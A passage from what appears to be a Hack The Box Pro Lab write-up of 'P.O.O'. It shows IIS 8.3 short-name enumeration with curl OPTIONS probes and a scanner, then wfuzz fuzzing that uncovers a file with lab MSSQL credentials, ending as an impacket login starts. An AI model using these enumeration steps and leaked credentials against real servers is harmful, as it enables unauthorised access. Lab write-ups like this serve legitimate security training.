</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> http://10.13.38.11/JS/custom
</span></span><span class="line"><span class="cl">----------------------------
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> http://10.13.38.11/Themes/default
</span></span><span class="line"><span class="cl">----------------------------
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> http://10.13.38.11/Widgets/CalendarEvents
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> http://10.13.38.11/Widgets/Framework
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> http://10.13.38.11/Widgets/Menu
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> http://10.13.38.11/Widgets/Notifications
</span></span><span class="line"><span class="cl">----------------------------
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> http://10.13.38.11/Widgets/Framework/Layouts
</span></span><span class="line"><span class="cl">----------------------------
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> http://10.13.38.11/Widgets/Framework/Layouts/custom
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> http://10.13.38.11/Widgets/Framework/Layouts/default
</span></span><span class="line"><span class="cl">----------------------------
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Finished traversing. No remaining .ds_store files present.
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Cleaning up .ds_store files saved to disk
</span></span></code></pre></div><p>This gives a pretty clear picture of the directories on the server. One thing that jumped out is the two directories in <code>/dev</code>, both of which look like md5hashes. Some quick guessing shows that they are actually md5 hashes of the two creators, <code>md5(mrb3n) = 304c0c90fbc6520610abbf378e2339d1</code> and <code>md5(eks) = dca66d38fd916317687e1390a420c3fc</code>.</p>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="low"
    alt="image.png"
    src="image%204.png"
    ></figure>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="low"
    alt="image.png"
    src="image%205.png"
    ></figure>

<h2 class="relative group">IIS Shortnames
    <div id="iis-shortnames" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#iis-shortnames" aria-label="Anchor">#</a>
    </span>
    
</h2>
<p>A key technique here is to exploit Windows&rsquo; short file names, known as the 8.3 naming convention, which restricts each file name to eight characters followed by a dot and a three-character extension. There was an <a
  href="https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf"
    target="_blank"
  >intriguing paper</a> that explored how earlier versions of IIS and .NET handle these 8.3 file names. The method involves examining how the server deals with 8.3 names that include wildcards, which it appears to process when the tilde (~) symbol is present in the file path.</p>
<p>Different servers may require different HTTP request methods to detect this behavior. On this particular server, the issue doesn’t appear with a GET request, but is exposed using an OPTIONS request. For instance, using gobuster, I found that there is a folder called templates in the root directory. When I send an OPTIONS request to <a
  href="http://10.13.0.38/11/t*~1*/.aspx"
    target="_blank"
  >http://10.13.38/11/t*~1*/.aspx</a>, the server responds with a 404 error. However, when I send a request to <a
  href="http://10.13.0.38/11/c*~1*/.aspx"
    target="_blank"
  >http://10.13.38/11/c*~1*/.aspx</a>, it responds with a 200 status code.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>n00b㉿v1c70r<span class="o">)</span>-<span class="o">[</span>~/HTB Prolabs/P.O.O<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ curl -s -I -X OPTIONS <span class="s1">&#39;http://10.13.38.11/c*~1*/.aspx&#39;</span>
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
</span></span><span class="line"><span class="cl">Allow: OPTIONS, TRACE, GET, HEAD, POST
</span></span><span class="line"><span class="cl">Server: Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl">Public: OPTIONS, TRACE, GET, HEAD, POST
</span></span><span class="line"><span class="cl">Date: Mon, <span class="m">07</span> Oct <span class="m">2024</span> 02:11:52 GMT
</span></span><span class="line"><span class="cl">Content-Length: <span class="m">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                                                                 
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>n00b㉿v1c70r<span class="o">)</span>-<span class="o">[</span>~/HTB Prolabs/P.O.O<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ curl -s -I -X OPTIONS <span class="s1">&#39;http://10.13.38.11/t*~1*/.aspx&#39;</span>
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">404</span> Not Found
</span></span><span class="line"><span class="cl">Content-Type: text/html
</span></span><span class="line"><span class="cl">Server: Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl">Date: Mon, <span class="m">07</span> Oct <span class="m">2024</span> 02:12:10 GMT
</span></span><span class="line"><span class="cl">Content-Length: <span class="m">1245</span>
</span></span></code></pre></div><p>I tried each character and got the next character to be s, as seen below.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>n00b㉿v1c70r<span class="o">)</span>-<span class="o">[</span>~/HTB Prolabs/P.O.O<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ curl -s -I -X OPTIONS <span class="s1">&#39;http://10.13.38.11/ta*~1*/.aspx&#39;</span>
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
</span></span><span class="line"><span class="cl">Allow: OPTIONS, TRACE, GET, HEAD, POST
</span></span><span class="line"><span class="cl">Server: Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl">Public: OPTIONS, TRACE, GET, HEAD, POST
</span></span><span class="line"><span class="cl">Date: Mon, <span class="m">07</span> Oct <span class="m">2024</span> 02:14:08 GMT
</span></span><span class="line"><span class="cl">Content-Length: <span class="m">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                                                                 
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>n00b㉿v1c70r<span class="o">)</span>-<span class="o">[</span>~/HTB Prolabs/P.O.O<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ curl -s -I -X OPTIONS <span class="s1">&#39;http://10.13.38.11/tem*~1*/.aspx&#39;</span>
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">404</span> Not Found
</span></span><span class="line"><span class="cl">Content-Type: text/html
</span></span><span class="line"><span class="cl">Server: Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl">Date: Mon, <span class="m">07</span> Oct <span class="m">2024</span> 02:14:15 GMT
</span></span><span class="line"><span class="cl">Content-Length: <span class="m">1245</span>
</span></span></code></pre></div><p>However, this does not work for  all directories / files. It does not find <code>/admin</code>,likely due to permissions. I found a couple of tools to do the brute force. <a
  href="https://github.com/irsdl/IIS-ShortName-Scanner"
    target="_blank"
  >This tool</a> is the one associated with the research paper above, but it’s in Java, so I kept looking and found <a
  href="https://github.com/lijiejie/IIS_shortname_Scanner"
    target="_blank"
  >this Python scanner</a>. When running it on the root directory, it found some of the stuff in it:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>n00b㉿v1c70r<span class="o">)</span>-<span class="o">[</span>~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ python3 iis_shortname_scan.py  http://10.13.38.11/ 
</span></span><span class="line"><span class="cl">Server is vulnerable, please wait, scanning...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /d~1.*      <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /n~1.*      <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /t~1.*      <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /w~1.*      <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /ds~1.*     <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /ne~1.*     <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /te~1.*     <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /tr~1.*     <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /we~1.*     <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /ds_~1.*    <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /new~1.*    <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /tem~1.*    <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /tra~1.*    <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /web~1.*    <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /ds_s~1.*   <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /newf~1.*   <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /temp~1.*   <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /tras~1.*   <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /ds_st~1.*  <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /newfo~1.*  <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /templ~1.*  <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /trash~1.*  <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /ds_sto~1.* <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /newfol~1.* <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /templa~1.* <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /trashe~1.* <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /ds_sto~1   <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Directory /ds_sto~1 <span class="o">[</span>Done<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /newfol~1   <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Directory /newfol~1 <span class="o">[</span>Done<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /templa~1   <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Directory /templa~1 <span class="o">[</span>Done<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /trashe~1   <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Directory /trashe~1 <span class="o">[</span>Done<span class="o">]</span>
</span></span><span class="line"><span class="cl">----------------------------------------------------------------
</span></span><span class="line"><span class="cl">Dir:  /ds_sto~1
</span></span><span class="line"><span class="cl">Dir:  /newfol~1
</span></span><span class="line"><span class="cl">Dir:  /templa~1
</span></span><span class="line"><span class="cl">Dir:  /trashe~1
</span></span><span class="line"><span class="cl">----------------------------------------------------------------
</span></span><span class="line"><span class="cl"><span class="m">4</span> Directories, <span class="m">0</span> Files found in total
</span></span><span class="line"><span class="cl">Note that * is a wildcard, matches any character zero or more times.
</span></span></code></pre></div><p>I&rsquo;m unsure why the script omits the dot before <code>.DS_Store</code>. It classifies it as a directory because, in the 8.3 naming scheme, files without an extension are interpreted as directories.</p>
<p>What&rsquo;s more intriguing is the behavior when I run the script against the <code>/dev</code> directories. At the root, it only detects <code>.DS_Store</code> and the two hash directories that I already know exist. Inside each of the hash directories, it only identifies <code>.DS_Store</code>. Interestingly, it shows that the <code>src</code>, <code>include</code>, and <code>core</code> directories are not vulnerable, but the <code>db</code> directory displays what seems to be the same file in both instances:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>n00b㉿v1c70r<span class="o">)</span>-<span class="o">[</span>~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ python3 iis_shortname_scan.py  http://10.13.38.11/dev/
</span></span><span class="line"><span class="cl">Server is vulnerable, please wait, scanning...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/d~1.*  <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/3~1.*  <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/ds~1.* <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/dc~1.* <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/30~1.* <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/ds_~1.*        <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/dca~1.*        <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/304~1.*        <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/ds_s~1.*       <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/dca6~1.*       <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/304c~1.*       <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/ds_st~1.*      <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/dca66~1.*      <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/304c0~1.*      <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/ds_sto~1.*     <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/dca66d~1.*     <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/304c0c~1.*     <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/ds_sto~1       <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Directory /dev/ds_sto~1     <span class="o">[</span>Done<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/dca66d~1       <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Directory /dev/dca66d~1     <span class="o">[</span>Done<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/304c0c~1       <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Directory /dev/304c0c~1     <span class="o">[</span>Done<span class="o">]</span>
</span></span><span class="line"><span class="cl">----------------------------------------------------------------
</span></span><span class="line"><span class="cl">Dir:  /dev/ds_sto~1
</span></span><span class="line"><span class="cl">Dir:  /dev/dca66d~1
</span></span><span class="line"><span class="cl">Dir:  /dev/304c0c~1
</span></span><span class="line"><span class="cl">----------------------------------------------------------------
</span></span><span class="line"><span class="cl"><span class="m">3</span> Directories, <span class="m">0</span> Files found in total
</span></span><span class="line"><span class="cl">Note that * is a wildcard, matches any character zero or more times.
</span></span><span class="line"><span class="cl">                                                                                 
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>n00b㉿v1c70r<span class="o">)</span>-<span class="o">[</span>~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ python3 iis_shortname_scan.py  http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db 
</span></span><span class="line"><span class="cl">Server is vulnerable, please wait, scanning...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/dca66d38fd916317687e1390a420c3fc/db/p~1.*      <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/dca66d38fd916317687e1390a420c3fc/db/po~1.*     <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/dca66d38fd916317687e1390a420c3fc/db/poo~1.*    <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/dca66d38fd916317687e1390a420c3fc/db/poo_~1.*   <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/dca66d38fd916317687e1390a420c3fc/db/poo_c~1.*  <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.* <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.t*        <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.tx*       <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt*      <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> File /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt* <span class="o">[</span>Done<span class="o">]</span>
</span></span><span class="line"><span class="cl">----------------------------------------------------------------
</span></span><span class="line"><span class="cl">File: /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt*
</span></span><span class="line"><span class="cl">----------------------------------------------------------------
</span></span><span class="line"><span class="cl"><span class="m">0</span> Directories, <span class="m">1</span> Files found in total
</span></span><span class="line"><span class="cl">Note that * is a wildcard, matches any character zero or more times.
</span></span><span class="line"><span class="cl">                                                                                 
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>n00b㉿v1c70r<span class="o">)</span>-<span class="o">[</span>~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ python3 iis_shortname_scan.py  http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db
</span></span><span class="line"><span class="cl">Server is vulnerable, please wait, scanning...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/304c0c90fbc6520610abbf378e2339d1/db/p~1.*      <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/304c0c90fbc6520610abbf378e2339d1/db/po~1.*     <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/304c0c90fbc6520610abbf378e2339d1/db/poo~1.*    <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_~1.*   <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_c~1.*  <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.* <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.t*        <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.tx*       <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.txt*      <span class="o">[</span>scan in progress<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> File /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.txt* <span class="o">[</span>Done<span class="o">]</span>
</span></span><span class="line"><span class="cl">----------------------------------------------------------------
</span></span><span class="line"><span class="cl">File: /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.txt*
</span></span><span class="line"><span class="cl">----------------------------------------------------------------
</span></span><span class="line"><span class="cl"><span class="m">0</span> Directories, <span class="m">1</span> Files found in total
</span></span><span class="line"><span class="cl">Note that * is a wildcard, matches any character zero or more times.
</span></span><span class="line"><span class="cl">                                                                      
</span></span></code></pre></div>
<h2 class="relative group">File fuzzing
    <div id="file-fuzzing" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#file-fuzzing" aria-label="Anchor">#</a>
    </span>
    
</h2>
<p>I’m aware of a <code>.txt</code> file in <code>/dev/304c0c90fbc6520610abbf378e2339d1/db/</code> that begins with <code>poo_co</code>. At this point, I can use <code>wfuzz</code> to try and discover the rest of the filename. To narrow down the search, I’ll extract words starting with &lsquo;co&rsquo; from <code>raft-large-words-lowercase.txt</code>, which generates a relatively compact wordlist to work with:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>n00b㉿v1c70r<span class="o">)</span>-<span class="o">[</span>~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ grep <span class="s2">&#34;^co&#34;</span> /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt &gt; co_fuzzing.txt 
</span></span><span class="line"><span class="cl">                                                                                 
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>n00b㉿v1c70r<span class="o">)</span>-<span class="o">[</span>~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ wc -l co_fuzzing.txt
</span></span><span class="line"><span class="cl"><span class="m">2351</span> co_fuzzing.txt
</span></span></code></pre></div><p>lets try and fuzz now.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>n00b㉿v1c70r<span class="o">)</span>-<span class="o">[</span>~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ wfuzz -c -w co_fuzzing.txt -u http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_FUZZ.txt --hc <span class="m">404</span>
</span></span><span class="line"><span class="cl">********************************************************
</span></span><span class="line"><span class="cl">* Wfuzz 3.1.0 - The Web Fuzzer                         *
</span></span><span class="line"><span class="cl">********************************************************
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Target: http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_FUZZ.txt
</span></span><span class="line"><span class="cl">Total requests: <span class="nv">2351</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">=====================================================================</span>
</span></span><span class="line"><span class="cl">ID           Response   Lines    Word       Chars       <span class="nv">Payload</span>         
</span></span><span class="line"><span class="cl"><span class="o">=====================================================================</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">000000097:   <span class="m">200</span>        <span class="m">6</span> L      <span class="m">7</span> W        <span class="m">142</span> Ch      <span class="s2">&#34;connection&#34;</span>    
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Total time: 87.84663
</span></span><span class="line"><span class="cl">Processed Requests: <span class="m">2351</span>
</span></span><span class="line"><span class="cl">Filtered Requests: <span class="m">2350</span>
</span></span><span class="line"><span class="cl">Requests/sec.: 26.76255
</span></span></code></pre></div><p>Retrieving this file (from either <code>dev</code> directory) reveals connection details for MSSQL and the first flag, Recon:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>n00b㉿v1c70r<span class="o">)</span>-<span class="o">[</span>~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ curl -s http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_connection.txt
</span></span><span class="line"><span class="cl"><span class="nv">SERVER</span><span class="o">=</span>10.13.38.11
</span></span><span class="line"><span class="cl"><span class="nv">USERID</span><span class="o">=</span>external_user
</span></span><span class="line"><span class="cl"><span class="nv">DBNAME</span><span class="o">=</span>POO_PUBLIC
</span></span><span class="line"><span class="cl"><span class="nv">USERPWD</span><span class="o">=</span><span class="c1">#p00Public3xt3rnalUs3r#</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Flag : <span class="o">[</span>REDACTED<span class="o">]</span>
</span></span></code></pre></div>
<h1 class="relative group">Huh?!
    <div id="huh" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#huh" aria-label="Anchor">#</a>
    </span>
    
</h1>

<h2 class="relative group">MSSQL Enumeration.
    <div id="mssql-enumeration" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#mssql-enumeration" aria-label="Anchor">#</a>
    </span>
    
</h2>
<p>Using creds from the previous step, I can now connect to the MSSQL instance on TCP 1433</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿v1c70r<span class="o">)</span>-<span class="o">[</span>/home/…/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─# python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py external_user:#p00Public3xt3rnalUs3r#@10.13.38.11
</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Encryption required, switching to TLS
